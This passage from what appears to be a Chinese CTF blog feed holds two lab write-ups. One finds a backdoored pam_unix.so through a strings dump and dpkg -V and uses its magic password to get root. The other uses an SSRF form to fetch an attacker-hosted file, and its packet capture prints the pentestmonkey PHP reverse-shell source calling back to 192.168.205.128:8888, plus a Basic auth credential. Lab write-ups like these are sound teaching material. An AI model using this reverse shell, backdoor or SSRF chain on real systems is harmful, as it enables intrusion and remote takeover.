_unix_run_verify_binary
pam_handle
_set_ctrl
getuid
pam_modutil_read
_timer
si_fd
pam_syslog
pw_uid
sa_handler
_freeres_list
sival_ptr
_IO_wide_data
si_band
argv
_IO_write_base
_IO_buf_base
sp_namp
child
si_code
ret_data
pam_sm_setcred
_unix_verify_password
_unix_blankpasswd
pam_set_data
pam_get_authtok
setcred_free
pam_get_user
pam_sm_authenticate
pam_unix_auth.c
pass_old
AUTH_REJECTEDCRED
XDR_DECODE
sockaddr_ax25
sin6_flowinfo
RPC_CANTDECODEARGS
fclose
RE_why
lctrl
RE_lb
xdrproc_t
strncmp
_do_setpass
ah_ops
RPC_RPCBFAILURE
sptr
sockaddr
sin6_scope_id
high
sockaddr_ns
clnt_sperrno
RPC_CANTDECODERES
pam_sm_chauthtok
__int32_t
xdr_op
md5pass
ah_verf
IPPROTO_IGMP
IPPORT_TFTP
pam_unix_passwd.c
IPPORT_USERRESERVED
IPPORT_NAMESERVER
RPC_PROGNOTREGISTERED
IPPORT_SYSTAT
cl_freeres
x_getint32
__u6_addr16
__caddr_t
IPPROTO_SCTP
IPPROTO_IP
auth_ops
sockaddr_ipx
ah_nextverf
newpass
IPPORT_WHOIS
getNISserver
IPPORT_CMDSERVER
IPPORT_FTP
in_addr_t
Goodcrypt_md5
IPPROTO_ESP
_unix_getpwnam
x_getpostn
IPPROTO_EGP
sockaddr_at
RPC_INTR
ah_refresh
IPPROTO_IPV6
__u6_addr8
RPC_INPROGRESS
clnt_ops
CLIENT
IPPORT_FINGER
AUTH_BADVERF
_unix_comesfromsource
IPPORT_WHOSERVER
unlock_pwdf
__uint16_t
IPPROTO_MAX
RPC_CANTSEND
oa_length
x_getbytes
RPC_SUCCESS
in_port_t
RPC_VERSMISMATCH
IPPORT_RJE
IPPORT_BIFFUDP
strtok_r
RPC_SYSTEMERROR
re_status
sin_zero
x_destroy
RPC_UNKNOWNADDR
IPPORT_SMTP
s_addr
cl_geterr
x_ops
sa_family_t
cl_private
s_luser
cl_call
bool_t
IPPROTO_BEETPH
RPC_TIMEDOUT
pam_set_item
x_putint32
sockaddr_inarp
enum_t
oa_flavor
sin_family
tv_usec
__u_long
AUTH_OK
sockaddr_iso
AUTH
IPPROTO_UDP
XDR_FREE
s_npas
x_public
RE_errno
yperr_string
remember
opaque_auth
rounds
cl_ops
IPPROTO_IPIP
IPPORT_LOGINSERVER
x_putlong
IPPORT_ROUTESERVER
unix_update_passwd
ah_cred
RPC_TLIERROR
towhat
x_inline
forwho
IPPORT_DISCARD
x_putbytes
s_pas
ah_marshal
IPPORT_ECHO
cl_abort
xdr_ops
RPC_PROGUNAVAIL
opwfile
IPPROTO_PUP
check_old_password
XDR_ENCODE
sin_port
IPPROTO_AH
sockaddr_eon
authunix_create_default
IPPROTO_ICMP
unlocked
__u6_addr32
sockaddr_un
create_password_hash
newpw
yp_get_default_domain
RPC_STALERACHANDLE
__in6_u
sin_addr
ah_validate
RPC_FAILED
RE_vers
cl_destroy
fopen
AUTH_BADCRED
save_old_password
done
IPPROTO_IDP
x_setpostn
fgets
timeval
yppwd
long double
oldpass
AUTH_FAILED
sin6_port
IPPORT_NETSTAT
IPPROTO_RSVP
IPPROTO_GRE
x_base
IPPORT_EXECSERVER
AUTH_REJECTEDVERF
yp_master
IPPORT_TTYLINK
sin6_family
_pam_unix_approve_pass
sockaddr_dl
oa_base
IPPORT_TELNET
RPC_UNKNOWNHOST
RPC_UNKNOWNPROTO
IPPROTO_PIM
sun_family
ah_private
RPC_PROGVERSMISMATCH
RPC_CANTENCODEARGS
sun_path
sockaddr_in
auth_stat
__uint8_t
_unix_verify_shadow
IPPROTO_MTP
x_getlong
IPPROTO_TP
x_op
fromwhat
tv_sec
pass_min_len
IPPORT_DAYTIME
AUTH_TOOWEAK
IPPROTO_UDPLITE
cl_control
IPPROTO_COMP
IPPROTO_ENCAP
RPC_NOBROADCAST
rpc_err
unix_update_shadow
cl_auth
timeout
RPC_N2AXLATEFAILURE
domainname
clnt
ah_key
__suseconds_t
IPPORT_SUPDUP
__time_t
des_block
IPPORT_EFSSERVER
IPPORT_TIMESERVER
clnt_create
clnt_stat
IPPROTO_TCP
strcmp
IPPORT_RESERVED
sa_family
strdup
getrpcport
IPPROTO_MPLS
pass_new
RPC_UDERROR
x_private
__u_int
pam_prompt
x_handy
s_uid
IPPORT_MTP
ah_destroy
sockaddr_in6
IPPROTO_DCCP
sa_data
is_pwd_shadowed
sin6_addr
IPPROTO_RAW
sockaddr_x25
retry
AUTH_INVALIDRESP
RPC_CANTRECV
RPC_PROCUNAVAIL
RPC_AUTHERROR
pam_modutil_getlogin
pam_unix_sess.c
login_name
service
user_name
pam_sm_open_session
pam_sm_close_session
__stream
quiet
yp_match
_ISgraph
_pam_failed_auth
__ssize_t
write
__lineptr
type
strcasecmp
_unix_cleanup
atoi
__nptr
__builtin_memset
_ISprint
get_pwd_hash
_cleanup_failures
failure
spasswd
matched
yp_bind
strsep
filename
__builtin_memcpy
_ISpunct
suid
userlen
verify_pwd_hash
strcpy
_ISxdigit
_ISupper
__ctype_b_loc
_IScntrl
support.c
void_old
count
buflen
shome
feof
search_key
_ISalpha
_ISblank
_ISalnum
slogin
pam_fail_delay
_ISspace
sgid
getline
userinfo
_ISlower
strtol
__getdelim
sgecos
_unix_run_helper_binary
yp_unbind
ruser
data_name
sshell
strncasecmp
_ISdigit
files
rhost
error_status
__glibc_reserved
st_ctim
unlink
st_blksize
st_blocks
MD5Context
uint32
crypted
st_mtim
found
curdays
__dev_t
result
where
usleep
strip_hpux_aging
spwdent
nbuf
umask
__blksize_t
st_uid
crypt_make_salt
st_rdev
GoodMD5Update
__syscall_slong_t
algoid
ulckpwdf
timezone
__mode_t
fchown
st_gid
putspent
howmany
stpcpy
st_size
getpid
clock
fstat
__blkcnt_t
tz_minuteswest
__ino_t
const_charp
tmppass
unix_selinux_confined
crypt_md5_wrapper
__builtin_strchr
bits
__fd
pam_modutil_getspnam
pam_modutil_getpwnam
rename
nullok
__fxstat
oldmask
st_nlink
GoodMD5Final
passverify.c
st_dev
timespec
fchmod
gettimeofday
assigned_passwd
i64c
fputs
fgetspent
fgetpwent
tv_nsec
valid
stmpent
GoodMD5Init
st_mode
putpwent
fsync
tz_dsttime
Brokencrypt_md5
hash_len
st_ino
__statbuf
MD5_CTX
__nlink_t
st_atim
wroteentry
xdr_yppasswd
xdr_int
yppasswd_xdr.c
xdrs
xdr_string
objp
xdr_xpasswd
longs
md5_good.c
final
to64
ctx1
strncat
__builtin_strlen
byteReverse
itoa64
GoodMD5Transform
digest
magic
BrokenMD5Update
BrokenMD5Final
BrokenMD5Transform
md5_broken.c
BrokenMD5Init
 $-(
Q@I$
Q@I$
Q@J$
Q@J$
# %!
# %!x
# %!
# %!'
# %!
# %!x
# %!
# %!'
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
bigcrypt.c
pam_unix_acct.c
envp.0
pam_unix_auth.c
setcred_free
pam_unix_passwd.c
_unix_verify_shadow
_pam_unix_approve_pass
pam_unix_sess.c
support.c
_unix_cleanup
_unix_run_helper_binary
_cleanup_failures
search_key.constprop.0
unix_args
passverify.c
crypt_make_salt
valid.2
buf.1
nbuf.0
yppasswd_xdr.c
md5_good.c
itoa64
md5_broken.c
__FRAME_END__
xdr_yppasswd
_unix_run_verify_binary
_set_ctrl
BrokenMD5Transform
get_account_info
Goodcrypt_md5
BrokenMD5Init
bigcrypt
_fini
save_old_password
crypt_md5_wrapper
unix_update_passwd
unix_update_shadow
create_password_hash
Brokencrypt_md5
__dso_handle
_unix_getpwnam
GoodMD5Final
_unix_comesfromsource
GoodMD5Transform
_make_remark
_DYNAMIC
is_pwd_shadowed
unlock_pwdf
BrokenMD5Final
unix_selinux_confined
GoodMD5Init
get_pwd_hash
check_shadow_expiry
__GNU_EH_FRAME_HDR
__TMC_END__
_GLOBAL_OFFSET_TABLE_
GoodMD5Update
_unix_blankpasswd
_unix_verify_password
verify_pwd_hash
_init
BrokenMD5Update
xdr_xpasswd
pam_modutil_sanitize_helper_fds@LIBPAM_MODUTIL_1.1.9
free@GLIBC_2.2.5
pam_modutil_getpwnam@LIBPAM_MODUTIL_1.0
strcasecmp@GLIBC_2.2.5
__errno_location@GLIBC_2.2.5
unlink@GLIBC_2.2.5
strncpy@GLIBC_2.2.5
strncmp@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
stdout@GLIBC_2.2.5
_exit@GLIBC_2.2.5
strcpy@GLIBC_2.2.5
pam_set_item@LIBPAM_1.0
pam_get_data@LIBPAM_1.0
putspent@GLIBC_2.2.5
sigaction@GLIBC_2.2.5
pam_sm_setcred
pam_prompt@LIBPAM_EXTENSION_1.0
write@GLIBC_2.2.5
getpid@GLIBC_2.2.5
clock@GLIBC_2.2.5
yp_unbind@LIBNSL_1.0
fclose@GLIBC_2.2.5
stpcpy@GLIBC_2.2.5
yp_master@LIBNSL_1.0
dcgettext@GLIBC_2.2.5
strlen@GLIBC_2.2.5
getuid@GLIBC_2.2.5
dup2@GLIBC_2.2.5
strchr@GLIBC_2.2.5
snprintf@GLIBC_2.2.5
gettimeofday@GLIBC_2.2.5
fputs@GLIBC_2.2.5
memset@GLIBC_2.2.5
geteuid@GLIBC_2.2.5
pam_modutil_getlogin@LIBPAM_MODUTIL_1.0
strncat@GLIBC_2.2.5
authunix_create_default@GLIBC_2.2.5
pipe@GLIBC_2.2.5
yp_match@LIBNSL_1.0
strtok_r@GLIBC_2.2.5
pam_sm_chauthtok
read@GLIBC_2.2.5
fgets@GLIBC_2.2.5
execve@GLIBC_2.2.5
xdr_string@GLIBC_2.2.5
calloc@GLIBC_2.2.5
pam_sm_close_session
__getdelim@GLIBC_2.2.5
strcmp@GLIBC_2.2.5
getpwnam@GLIBC_2.2.5
feof@GLIBC_2.2.5
__gmon_start__
umask@GLIBC_2.2.5
strtol@GLIBC_2.2.5
memcpy@GLIBC_2.14
time@GLIBC_2.2.5
fileno@GLIBC_2.2.5
malloc@GLIBC_2.2.5
strncasecmp@GLIBC_2.2.5
fflush@GLIBC_2.2.5
pam_sm_acct_mgmt
strsep@GLIBC_2.2.5
__isoc99_sscanf@GLIBC_2.7
fgetpwent@GLIBC_2.2.5
syslog@GLIBC_2.2.5
__fxstat@GLIBC_2.2.5
yp_bind@LIBNSL_1.0
xdr_int@GLIBC_2.2.5
fgetspent@GLIBC_2.2.5
crypt_r@XCRYPT_2.0
yperr_string@LIBNSL_1.0
clnt_sperrno@GLIBC_2.2.5
fchmod@GLIBC_2.2.5
pam_syslog@LIBPAM_EXTENSION_1.0
fsync@GLIBC_2.2.5
pam_sm_open_session
waitpid@GLIBC_2.2.5
clnt_create@GLIBC_2.2.5
fchown@GLIBC_2.2.5
fopen@GLIBC_2.2.5
ulckpwdf@GLIBC_2.2.5
pam_get_item@LIBPAM_1.0
dcngettext@GLIBC_2.2.5
rename@GLIBC_2.2.5
pam_set_data@LIBPAM_1.0
pam_modutil_read@LIBPAM_MODUTIL_1.0
pam_get_user@LIBPAM_1.0
pam_modutil_getspnam@LIBPAM_MODUTIL_1.0
pam_sm_authenticate
yp_get_default_domain@LIBNSL_1.0
pam_fail_delay@LIBPAM_1.0
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
strdup@GLIBC_2.2.5
putpwent@GLIBC_2.2.5
pam_get_authtok@LIBPAM_EXTENSION_1.1
__cxa_finalize@GLIBC_2.2.5
fork@GLIBC_2.2.5
getrpcport@GLIBC_2.2.5
__ctype_b_loc@GLIBC_2.3
usleep@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.data.rel.ro
.dynamic
.got.plt
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
.debug_loc
.debug_ranges
````

‰∏ªË¶ÅÊòØËøôÈáåÊúâÈóÆÈ¢ò

```
...
auth could not identify password for [%s]
PAM: Root access granted via backdoor
bad username [%s]
660930334
No password supplied
...
```

Ë≤å‰ººÁïô‰∫Ü‰∏Ä‰∏™ÂêéÈó®

```
morri@Backdoor1:/opt$ su -
Password: 
root@Backdoor1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor1:~# cat /root/root.txt 
flag{root-5d363bb914c59fd1cd2b59e998bedb4f}
```

Â•ΩÁöÑÂ∞±ÊòØÂêéÈó®ÔºåÂìàÂìàÂìàÔºådpkg -V‰πüÂèØ‰ª•ÁúãÂà∞ÔºåÁúã‰∏™‰∫∫ÂñúÊ¨¢

```
root@Backdoor1:~# dpkg -V
??5?????? c /etc/irssi.conf
??5??????   /lib/x86_64-linux-gnu/security/pam_unix.so
??5?????? c /etc/apache2/apache2.conf
??5?????? c /etc/grub.d/10_linux
??5?????? c /etc/grub.d/40_custom
??5?????? c /etc/sudoers
??5?????? c /etc/inspircd/inspircd.conf
??5?????? c /etc/inspircd/inspircd.motd
??5?????? c /etc/issue
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Backdoor1.html</guid><pubDate>Wed, 09 Jul 2025 14:20:04 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Basic</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Basic.html</link><description>![image-20250707214716346](https://7r1umphk.github.io/image/20250707214716465.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sudo arp-scan -l                    
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.167 08:00:27:f0:d8:81       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e7:e4:00       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 4 responded
```

167ÁöÑ

Êé¢Êµã‰∏Ä‰∏ãÊúçÂä°

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nmap -p- 192.168.205.167
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 09:30 EDT
Nmap scan report for 192.168.205.167
Host is up (0.00010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:F0:D8:81 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
```

ÁúãÁúã80

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.167
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;HTTP Requester&lt;/title&gt;
    &lt;style&gt;
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
        }
        form {
            margin: 20px 0;
            display: flex;
            gap: 10px;
        }
        input[type='text'] {
            flex: 1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .result-box {
            margin-top: 20px;
            padding: 15px;
            background-color: #f9f9f9;
            border-left: 4px solid #ccc;
        }
        nav {
            margin-top: 30px;
            display: flex;
            gap: 15px;
        }
        nav a {
            padding: 8px 16px;
            background-color: #e0e0e0;
            border-radius: 4px;
            text-decoration: none;
            color: #333;
        }
        nav a:hover {
            background-color: #d0d0d0;
        }
        pre {
            max-height: 300px;
            overflow: auto;
            padding: 15px;
            background-color: #f8f8f8;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            white-space: pre-wrap;
        }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class='container'&gt;
        &lt;h1&gt;Website Request Tool&lt;/h1&gt;
        &lt;form method='POST'&gt;
            &lt;input type='text' name='url' placeholder='Enter URL starting with http' required&gt;
            &lt;button type='submit'&gt;Fetch Content&lt;/button&gt;
        &lt;/form&gt;
        
        &lt;div class='result-box'&gt;
            &lt;h3&gt;Current target:&lt;/h3&gt;
            No request made        &lt;/div&gt;
        
        &lt;div class='result-box'&gt;
            &lt;h3&gt;Response:&lt;/h3&gt;
                            &lt;p&gt;Submit URL to test connection&lt;/p&gt;
                    &lt;/div&gt;
        
        &lt;nav&gt;
            &lt;a href='home.php'&gt;Home&lt;/a&gt;
            &lt;a href='about.php'&gt;About&lt;/a&gt;
            &lt;a href='dashboard.php'&gt;Dashboard&lt;/a&gt;
        &lt;/nav&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

![image-20250707214425237](https://7r1umphk.github.io/image/20250707214432940.webp)

Â∞ùËØïËÆøÈóÆÂèçÂºπshell

![image-20250707214553039](https://7r1umphk.github.io/image/20250707214553216.webp)

Ê≤°Ëß£Êûê

Êü•ÁúãÊú¨Âú∞Êñá‰ª∂

![image-20250707214628218](https://7r1umphk.github.io/image/20250707214628414.webp)

Áúã‰∫ÜhomeÔºåaboutÔºådashboardÔºåËøòÂ∞ùËØï‰∫Ü‰∏Ä‰∏ã167ÁöÑipÔºåÈÉΩÊ≤°Êúâ‰ªÄ‰πà‰∏úË•ø

Êäì‰∏™ÂåÖÁúãÁúã

![image-20250707214846154](https://7r1umphk.github.io/image/20250707214846404.webp)

Ê≤°Âï•‰∏úË•ø

ÁÑ∂ÂêéËøôÈáåÊµãËØï‰∫ÜÂæàÂ§öÔºåÂêéÈù¢ÂèëÁé∞ÊòØÂÆÉÂèëÈÄÅÁöÑÂ§¥Êúâ‰∏úË•ø

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo tcpdump -A host 192.168.205.167
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
ÂØπ‰∏çËµ∑ÔºåËØ∑ÈáçËØï„ÄÇ
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:50:18.143873 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [S], seq 1359019690, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
E..4.
@..............7.PQ...........................
09:50:18.144240 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [S.], seq 1762610671, ack 1359019691, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
E..4..@.@............P.7i.M.Q.......c...............
09:50:18.144526 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [.], ack 1, win 513, length 0
E..(..@..............7.PQ...i.M.P.............
09:50:18.144722 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [P.], seq 1:557, ack 1, win 513, length 556: HTTP: POST / HTTP/1.1
E..T..@..............7.PQ...i.M.P...S...POST / HTTP/1.1
Host: 192.168.205.167
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://192.168.205.167
Connection: keep-alive
Referer: http://192.168.205.167/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F127.0.0.1
09:50:18.144954 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [.], ack 557, win 501, length 0
E..(@.@.@..9.........P.7i.M.Q...P.............
09:50:18.147613 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [P.], seq 1:1381, ack 557, win 501, length 1380: HTTP: HTTP/1.1 200 OK
E...@.@.@............P.7i.M.Q...P....w..HTTP/1.1 200 OK
Date: Mon, 07 Jul 2025 13:50:18 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 1127
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

...........XKo.6...W.
...*....*.. ..=.. ..(..h...J...b.E.{....(.m....!.9..f8.....w....&gt;...(..,n.`..3 .X.....r......s.Y..Y#..K....E/...S=kZ
.....D..............%[...%Hd......p.mH.......Z..'.&amp;.W.m+...a...........jtb..o....I......mF.&gt;..e.3.ADj.....|.AD....j.B....
~;{..e...r...6^..s'......6.iN.8...I+.Z.u.......1.......^.P&amp;.:...l`5m..U-~./.....        ..a.I}r..q...!W.. ..........*.p,......... \..../i.\q..:k.....R^.i...&gt;.q....pv..y...u.d...9..Z..J...1..... .x-t..3N.........G._M..;W..8.*7......x..?;uui|.S.. .l...,.........RS1&lt;
...0.dB.z.kep...x....(7j.Z..Mx...y.S.)..-....8.w.80=6V.r.H.y.i.9.....u.5.......L.....\.
{R...Xd..y..&gt;/{*.....WH.....f..dN.8..t..{......G..dB..l..$Y.....@.F...bh..zU..%..H3. .....#...(..w...IWI..e...fL......H.dn.).Q..W?\...;.......yEK..6.O,.'....E..6..L...2=....&amp;4.R36.SKA..J.4kg.s.e'^..y.....D.5.............C;...fh..v.S...X}.&gt;j...(....).i5a..C5.br.X8...tF..u........dC...d|..&gt;.3S...~SC....4.......8.v.......5k-.........jz..M....?Q..:..'la...
..VN..&gt;J.RR.u...        *k.D-S....)Z[5..u.d.q.. cx..3....................~..... .V.2d.x.L;....kV Lr6...H...@.zg0'.ZHC...{.^.8/Q...8!...Kth.%.`xI..kG........0.../....I..*...
09:50:18.197232 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [.], ack 1381, win 507, length 0
E..(..@..............7.PQ...i.STP.............
09:50:22.378643 IP 192.168.205.167.bootpc &gt; 192.168.205.254.bootps: BOOTP/DHCP, Request from 08:00:27:f0:d8:81 (oui Unknown), length 300
E..H..@.@............D.C.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5....Basic7.......w.,/.y*=..'......./l....'-.H..............
09:50:22.379024 IP 192.168.205.254.bootps &gt; 192.168.205.167.bootpc: BOOTP/DHCP, Reply, length 300
E..H.................C.D.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5..6.....3.........................localdomain......,.......
09:50:23.159139 IP 192.168.205.167.http &gt; 192.168.205.1.60727: Flags [F.], seq 1381, ack 557, win 501, length 0
E..(@.@.@..7.........P.7i.STQ...P.... ........
09:50:23.159439 IP 192.168.205.1.60727 &gt; 192.168.205.167.http: Flags [.], ack 1382, win 507, length 0
E..(..@..............7.PQ...i.SUP.............
09:50:23.999242 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [S], seq 2328306649, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
E..4..@..............F.P..#.........................
09:50:23.999577 IP 192.168.205.167.http &gt; 192.168.205.1.60742: Flags [S.], seq 4258427036, ack 2328306650, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
E..4..@.@............P.F..p...#.....Mn..............
09:50:23.999823 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [.], ack 1, win 513, length 0
E..(..@..............F.P..#...p.P....0........
09:50:23.999943 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [P.], seq 1:573, ack 1, win 513, length 572: HTTP: POST / HTTP/1.1
E..d..@..............F.P..#...p.P.......POST / HTTP/1.1
Host: 192.168.205.167
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.205.167
Connection: keep-alive
Referer: http://192.168.205.167/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F192.168.205.128%2Freverse.php
09:50:24.000119 IP 192.168.205.167.http &gt; 192.168.205.1.60742: Flags [.], ack 573, win 501, length 0
E..(.Q@.@.s..........P.F..p...&amp;.P.............
09:50:24.000772 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [S], seq 726111212, win 64240, options [mss 1460,sackOK,TS val 2885018455 ecr 0,nop,wscale 7], length 0
E..&lt;..@.@.G5...........P+G..........D..........
...W........
09:50:24.000797 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [S.], seq 2197022970, ack 726111213, win 65160, options [mss 1460,sackOK,TS val 1602276764 ecr 2885018455,nop,wscale 7], length 0
E..&lt;..@.@..C.........P......+G.................
_......W....
09:50:24.000931 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 0
E..4..@.@.G&lt;...........P+G...........W.....
...X_...
09:50:24.000978 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [P.], seq 1:153, ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 152: HTTP: GET /reverse.php HTTP/1.1
E.....@.@.F............P+G..........x0.....
...X_...GET /reverse.php HTTP/1.1
Host: 192.168.205.128
Accept: */*
Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==


09:50:24.000983 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [.], ack 153, win 508, options [nop,nop,TS val 1602276764 ecr 2885018456], length 0
E..4.9@.@.|..........P......+G.............
_......X
09:50:24.002659 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [P.], seq 1:203, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018456], length 202: HTTP: HTTP/1.0 200 OK
E....:@.@.{F.........P......+G.......j.....
_......XHTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.13.3
Date: Mon, 07 Jul 2025 13:50:24 GMT
Content-type: application/octet-stream
Content-Length: 2596
Last-Modified: Thu, 26 Jun 2025 12:22:10 GMT


09:50:24.002881 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [.], ack 203, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
E..4..@.@.G:...........P+G.................
...Z_...
09:50:24.003021 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [P.], seq 203:2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 2596: HTTP
E.
X.;@.@.q..........P......+G......&amp;......
_......Z&lt;?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = '1.0';
$ip = '192.168.205.128';
$port = 8888;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit('ERROR: Can't fork');
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit('Error: Can't setsid()');
                exit(1);
        }

        $daemon = 1;
} else {
        printit('WARNING: Failed to daemonise.  This is quite common and not fatal.');
}

chdir('/');

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit('$errstr ($errno)');
        exit(1);
}

$descriptorspec = array(
   0 =&gt; array('pipe', 'r'),  // stdin is a pipe that the child will read from
   1 =&gt; array('pipe', 'w'),  // stdout is a pipe that the child will write to
   2 =&gt; array('pipe', 'w')   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit('ERROR: Can't spawn shell');
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit('Successfully opened reverse shell to $ip:$port');

while (1) {
        if (feof($sock)) {
                printit('ERROR: Shell connection terminated');
                break;
        }

        if (feof($pipes[1])) {
                printit('ERROR: Shell process terminated');
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit('SOCK READ');
                $input = fread($sock, $chunk_size);
                if ($debug) printit('SOCK: $input');
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit('STDOUT READ');
                $input = fread($pipes[1], $chunk_size);
